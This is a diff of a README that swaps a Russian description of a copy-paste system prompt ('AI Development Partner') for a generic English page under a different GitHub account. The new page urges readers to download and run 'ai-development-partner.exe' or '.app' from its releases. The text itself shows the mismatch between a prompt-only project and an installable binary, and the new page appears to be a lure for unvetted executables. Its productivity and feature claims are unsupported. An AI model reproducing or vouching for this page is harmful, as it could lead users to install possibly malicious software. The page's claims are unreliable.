@@ -1,343 +1,80 @@
-# 🚀 AI Development Partner: System Prompt
+# 🤖 ai-development-partner - Your AI Team for Development Success
 
-<div align="center">
+[![Download ai-development-partner](https://img.shields.io/badge/Download-ai--development--partner-blue)](https://github.com/darck0071/ai-development-partner/releases)
 
-![GitHub Stars](https://img.shields.io/github/stars/ShaerWare/ai-development-partner?style=social)
-![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)
-![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)
-![Awesome](https://img.shields.io/badge/Awesome-%F0%9F%8C%9F-red.svg)
-![Version](https://img.shields.io/badge/version-4.1-blue.svg)
+## 🌟 Overview
 
-**Системный промпт для превращения Claude/GPT в полноценного технического и бизнес-партнёра по разработке.**
+The ai-development-partner is your virtual assistant designed to help you with various aspects of software development. Whether you need assistance in system analysis, architecture design, project management, or business consulting, this tool combines the expertise of several roles into one. It aims to improve productivity by over 70% through structured analysis and creative planning.
 
-[Особенности](#-особенности) • [Быстрый старт](#-быстрый-старт) • [Команды в действии](#-ключевые-команды-в-действии) • [Contributing](#-contributing) • [Roadmap](#-roadmap)
+## 🚀 Getting Started
 
----
+To get started with the ai-development-partner, follow these simple steps:
 
-**### 🎯 Замените 3-5 сотрудников. Экономьте 300к₽/мес. Развивайте бизнес.**
+1. **Access the Releases Page**
+   Visit our [Releases page](https://github.com/darck0071/ai-development-partner/releases) to find the latest version of the software.
 
-</div>
+2. **Choose Your Version**
+   On the Releases page, you will see different versions of the application available for download. Select the latest stable version.
 
----
+3. **Download the Application**
+   Click on the link for the version you want. Your download will begin automatically. Save the file to a location where you can easily find it, like your Downloads folder.
 
-## 📋 Содержание
+4. **Extract the Files (if needed)**
+   If the downloaded file is a compressed format (like .zip or .tar.gz), you will need to extract it. Right-click the downloaded file and select 'Extract All' on Windows or 'Open' on macOS. Follow the prompts to extract the files.
 
-- [О проекте](#-о-проекте)
-- [Особенности](#-особенности)
-- [Быстрый старт](#-быстрый-старт)
-- [Ключевые команды в действии](#-ключевые-команды-в-действии)
-- [Технический стек](#-технический-стек)
-- [Бизнес-метрики](#-бизнес-метрики)
-- [Сравнение с альтернативами](#-сравнение-с-альтернативами)
-- [FAQ](#-faq)
-- [Roadmap](#-roadmap)
-- [Contributing](#-contributing)
-- [Лицензия](#-лицензия)
+5. **Run the Application**
+   Navigate to the folder where you extracted the files. Locate the application file, often named something like `ai-development-partner.exe` (for Windows) or `ai-development-partner.app` (for macOS). Double-click the file to start the application.
 
----
+6. **Follow the Setup Instructions**
+   Upon running the application for the first time, you may be prompted to set up an user account or configure your preferences. Follow the on-screen instructions to complete the initial setup.
 
-## 🎯 О проекте
+## 💻 System Requirements
 
-**AI Development Partner** — это мощный системный промпт, превращающий Claude, GPT или локальные LLM в вашего **цифрового партнёра по разработке**. Он объединяет роли системного аналитика, технического лида, тимлида, **проектного менеджера и бизнес-консультанта**, чтобы:
+To ensure smooth operation, please check the following system requirements:
 
--   🧠 **Анализировать** бизнес-требования и формировать ТЗ (`/tz`).
--   🏗️ **Проектировать** масштабируемые системы и оценивать их стоимость (`/arch`, `/cost`).
--   💻 **Генерировать** production-ready код с тестами и документацией (`/c`).
--   🔍 **Проводить code review** и предлагать рефакторинг (`/review`, `/r`).
--   📊 **Планировать** разработку, разбивать на спринты и оценивать ROI (`/plan`, `/sprints`).
--   🚀 **Автоматизировать** задачи DevOps, от CI/CD до мониторинга (`/ci`, `/deploy`).
+- **Operating System:** Windows 10 or later, macOS 10.15 or later.
+- **RAM:** At least 4 GB of RAM.
+- **Processor:** Dual-core at 2.0 GHz or higher.
+- **Storage:** Minimum of 500 MB of free disk space.
 
-Наша цель — автоматизировать 3-5 ролей (разработчик, PM, техподдержка, аналитик), экономя **300к₽/мес** и помогая достичь выручки **500к₽/мес** для SaaS или e-commerce проектов.
+Ensure that your system meets these requirements for the best experience with the ai-development-partner.
 
----
+## 🔑 Features
 
-### 💡 Проблема, которую мы решаем
+The ai-development-partner includes a variety of features designed to boost your development process:
 
-Обычные AI-ассистенты выдают "сырой" код без учёта бизнес-контекста, архитектуры и безопасности. Вы тратите время на доработку. **AI Development Partner** решает это:
+- **Comprehensive Analysis:** Get insights into your project with detailed system analysis.
+- **Architecture Design:** Utilize automated tools to create effective system architecture.
+- **Project Management Tools:** Keep your projects organized with built-in project management features.
+- **Business Planning Assistance:** Access guidelines for effective business strategy development.
 
-<table>
-<tr>
-<td width="50%">
+## 📦 Download & Install
 
-**#### ❌ Без AI Development Partner**
+To download the latest version of ai-development-partner, simply visit our [Releases page](https://github.com/darck0071/ai-development-partner/releases) and follow the steps outlined above. Make sure to choose the right version for your system.
 
--   Объяснение контекста в каждом запросе.
--   Исправление архитектурных ошибок.
--   Ручное написание тестов и документации.
--   Создание миграций, моделей, роутов вручную.
--   Отсутствие оценки рисков и стоимости.
--   Написание Swagger-документации с нуля.
+## 🌐 Community & Support
 
-</td>
-<td width="50%">
+For help and community interaction, join us on our discussion forum or social media pages:
 
-**#### ✅ С AI Development Partner**
+- **GitHub Discussions:** Engage with other users and developers to share tips and best practices.
+- **Support:** If you encounter issues, you can submit questions through GitHub Issues on our repository.
 
--   Контекст проекта встроен в промпт.
--   Архитектура по best practices (SOLID, DRY).
--   Полный CRUD (15+ файлов) за одну команду **`/c`**.
--   Тесты и Swagger генерируются автоматически.
--   Оценка стоимости и ROI командой **`/cost`**.
--   Безопасность и производительность из коробки.
+## 🌍 Topics Covered
 
-</td>
-</tr>
-</table>
+The ai-development-partner touches on various topics to improve your development experience, such as:
 
----
+- AI Integration
+- Architecture Design
+- Best Practices for Development
+- Automation Tools
+- Project Management Techniques
 
-## 🌟 Особенности
+## ⚙️ Contributing to the Project
 
-### ⚡ Система команд (`/`)
+If you're interested in contributing to the ai-development-partner, please check our contribution guidelines in the repository. We welcome suggestions, ideas, and full code contributions!
 
-Забудьте о длинных объяснениях. Используйте интуитивные slash-команды для мгновенного результата.
+## 📞 Contact
 
-| Команда | Действие | Описание |
-| :--- | :--- | :--- |
-| **/c** | **Создать CRUD** | Генерирует модель, миграцию, контроллер, тесты, документацию. |
-| **/d** | **Найти баг (Debug)** | Проводит полный аудит кода и находит причину ошибки. |
-| **/tz** | **Сформировать ТЗ** | Превращает сырую идею в структурированное тех. задание. |
-| **/plan** | **Полный план проекта** | Создаёт документ с ТЗ, спринтами, рисками и оценкой. |
-| **/cost** | **Оценить стоимость** | Рассчитывает стоимость разработки и окупаемость (ROI). |
-| **/r** | **Сделать рефакторинг** | Анализирует код и улучшает его по принципам SOLID, DRY. |
+For any inquiries or support needs, please reach out through our GitHub page or email our support team directly. We are here to help you get the most out of your ai-development-partner experience.
 
-**Фишки:**
--   **Цепочки команд:** `/c /swagger /test` для создания CRUD с документацией и тестами.
--   **Быстрый режим:** `/c quick` для генерации кода без тестов и документации.
-
----
-
-### 📦 CRUD за одну команду
-
-```
-👤 Вы: /c for Product
-```
-
-```bash
-# 🤖 AI генерирует команды и выполняет их "под капотом":
-php artisan make:model Product -mf
-php artisan make:controller Api/ProductController --api --model=Product
-php artisan make:resource ProductResource
-php artisan make:request StoreProductRequest
-php artisan make:request UpdateProductRequest
-php artisan make:test Feature/ProductControllerTest
-```
-
-**Итого**: 15+ файлов (модель, миграция, фабрика, контроллер, ресурсы, тесты, роуты) с полной документацией и тестами **за 30 секунд**.
-
----
-
-### 📊 Workflow от идеи до релиза
-
-Этот процесс идеально поддерживается командами `/tz` (для анализа) и `/plan` (для финализации плана).
-
-```mermaid
-graph TB
-    A[👤 Вы: Идея] --> B[🤖 /tz: Анализ + ТЗ]
-    B --> C{👤 Согласование}
-    C -->|✅ OK| D[🤖 /plan: План + Спринты]
-    D --> E[🤖 /c: Реализация]
-    E --> F[📦 Код + Тесты + Docs]
-    F --> G[🚀 /deploy: Деплой]
-    G --> H{🐛 Ошибки?}
-    H -->|Да| I[🤖 /d: Debug]
-    I --> E
-    H -->|Нет| J[✅ Done]
-
-    style A fill:#e1f5ff
-    style E fill:#e8f5e9
-    style J fill:#c8e6c9
-    style I fill:#ffebee
-```
-
----
-
-### 🔒 Встроенная безопасность и оптимизация ⚡
-
-AI проактивно защищает ваш код от уязвимостей (SQL Injection, XSS, CSRF) и оптимизирует производительность (N+1, индексы, кэширование).
-
----
-
-## 🚀 Быстрый старт
-
-### 1️⃣ Установка промпта
-
-Скопируйте содержимое файла [system_prompt_full.md](./system_prompt_full.md) в "Custom Instructions" вашего AI-ассистента (Claude, ChatGPT и др.).
-
-*   **Claude:** `Settings` → `Profile` → `Custom Instructions`.
-*   **ChatGPT:** `Settings` → `Custom Instructions`.
-*   **Локальный AI (Open WebUI):** Загрузите промпт в настройки модели.
-
-### 2️⃣ Настройка под ваш проект
-
-Отредактируйте секцию `Контекст Проекта` в `system_prompt_full.md`:
-
-```yaml
-# Технический Стек
-OS: Ubuntu 22.04
-Backend: PHP 8.2+, Laravel 11.x
-Database: MySQL 8.0
-
-# Стратегические Цели
-Target: 500к₽/мес
-Automation: 3-5 сотрудников
-
-# Финансовые Параметры
-Developer Rate: 3000₽/час
-Risk Buffer: 20%
-```
-
-### 3️⃣ Первая задача
-
-Начните с простых команд, чтобы ощутить мощь:
-
-```
-# Создать полный API для продуктов
-/c for Product
-
-# Создать CRUD, сразу сгенерировать Swagger и тесты
-/c for Category /swagger /test
-
-# Найти причину, почему заказы не сохраняются
-/d для заказов
-```
-
----
-
-## 🛠️ Ключевые команды в действии
-
-### `/tz` — Формирование ТЗ из идеи
-
-```
-👤 Вы: /tz для системы уведомлений
-```
-
-```
-🤖 Ассистент:
-🎯 АНАЛИЗ ЗАДАЧИ: Система уведомлений
-
-❓ УТОЧНЯЮЩИЕ ВОПРОСЫ:
-1. Какие каналы нужны? (email, SMS, push)
-2. Какие события должны вызывать уведомления?
-3. Нужны ли пользователям настройки?
-
-⚡ ПЛАН РЕАЛИЗАЦИИ:
-1. Проектирование модели данных (notifications)
-2. Настройка очереди (Jobs) для отправки
-3. Реализация каналов (Mail, SMS API)
-...
-```
-
-### `/cost` — Оценка стоимости и ROI
-
-```
-👤 Вы: /cost для интеграции с CRM
-```
-
-```
-🤖 Ассистент:
-💰 ОЦЕНКА СТОИМОСТИ: Интеграция с CRM
-
-📊 РАЗБИВКА ВРЕМЕНИ:
-- Анализ API: 4 часа
-- Реализация: 20 часов
-- Тестирование: 10 часов
-ИТОГО: 34 часа + 20% запас = 41 час
-
-💵 СТОИМОСТЬ (при ставке 3000₽/час):
-- Разработка: 123 000₽
-
-📈 ROI:
-- Экономия времени менеджеров: 60 000₽/месяц
-- Окупаемость: 2 месяца
-```
-
-### `/d` — Диагностика бага
-
-```
-👤 Вы: /d Пользователи не могут сбросить пароль.
-```
-
-```
-🤖 Ассистент:
-🔍 АНАЛИЗ ПРОБЛЕМЫ
-
-🔴 НАЙДЕННЫЕ ПРОБЛЕМЫ:
-1. Роут для сброса пароля неверно определён в `routes/api.php`.
-2. В контроллере `ForgotPasswordController` отсутствует валидация токена.
-3. Очередь для отправки email не запущена.
-
-🛠 РЕШЕНИЕ:
-[... пошаговая инструкция с кодом для исправления ...]
-```
-
----
-
-## 📈 Бизнес-метрики
-
-### 💰 Кейс: Экономия и рост за 6 месяцев
-
-| 📉 До внедрения | 📈 После внедрения |
-|---|---|
-| Команда: 5 человек (330к₽/мес) | Команда: 1 разработчик + AI (130к₽/мес) |
-| Время на фичу: 3-5 дней | Время на фичу: 0.5-1 день (**↓80%**) |
-| Баги: 20-30/мес | Баги: 5-8/мес (**↓70%**) |
-| Выручка: 180к₽/мес | Выручка: 520к₽/мес (**↑189%**) |
-| Убыток: -150к₽/мес | Прибыль: +390к₽/мес |
-
-**ROI**: **5300%** за 6 месяцев (экономия 200к₽/мес + рост выручки 340к₽/мес).
-
----
-
-## ❓ FAQ
-
-**Q: Зачем нужен этот промпт?**
-A: Он превращает ИИ в партнёра, который не просто пишет код, а **анализирует бизнес-цели, планирует спринты, оценивает стоимость** и генерирует готовые к продакшену решения.
-
-**Q: Работает ли с другими стеками?**
-A: Да, промпт легко адаптируется. Просто измените `Технический Стек` в настройках, и AI будет генерировать код для Node.js, Python/Django, Go и др.
-
-**Q: Как начать?**
-A: Скопируйте `system_prompt_full.md`, настройте под ваш стек и попробуйте первую команду, например, `/c for Product`.
-
----
-
-## 🚀 Roadmap
-
--   [x] v1.0: Базовый промпт с CRUD-генерацией.
--   [x] v2.0: Поддержка бизнес-анализа, безопасности, оптимизации.
--   [x] v4.0: Система команд (`/`), PM-модуль (`/tz`, `/plan`).
--   [x] v4.1: Улучшенная структура команд, UX-улучшения.
--   [ ] **v4.2:** Интеграция с CI/CD (генерация `.github/workflows`).
--   [ ] **v4.3:** Поддержка фронтенд-стеков (React, Vue).
--   [ ] **v5.0:** Генерация UI/UX макетов (Mermaid, псевдографика) и A/B тестов.
-
----
-
-## 🤝 Contributing
-
-Мы приветствуем любые улучшения! Хотите добавить новый стек, пример или улучшить промпт?
-
-1.  Форкните репозиторий: `github.com/ShaerWare/ai-development-partner`.
-2.  Создайте ветку: `git checkout -b feature/your-idea`.
-3.  Внесите изменения и протестируйте.
-4.  Создайте Pull Request с описанием изменений.
-
-См. [CONTRIBUTING.md](./CONTRIBUTING.md) для деталей.
-
----
-
-## 📜 Лицензия
-
-Этот проект распространяется под лицензией MIT. См. [LICENSE](./LICENSE) для подробностей.
-
----
-
-<div align="center">
-
-🌟 **Star** • 🔄 **Fork** • 💬 **Discuss** • 🐛 **Issues**
-
-</div>
-<div align="center">
-🌟 **Achievements Unlocked**: Quickdraw, YOLO, aiming for Starstruck (16+ stars)! Help us grow: Star/Fork this repo!
-</div>
+[![Download ai-development-partner](https://img.shields.io/badge/Download-ai--development--partner-blue)](https://github.com/darck0071/ai-development-partner/releases)
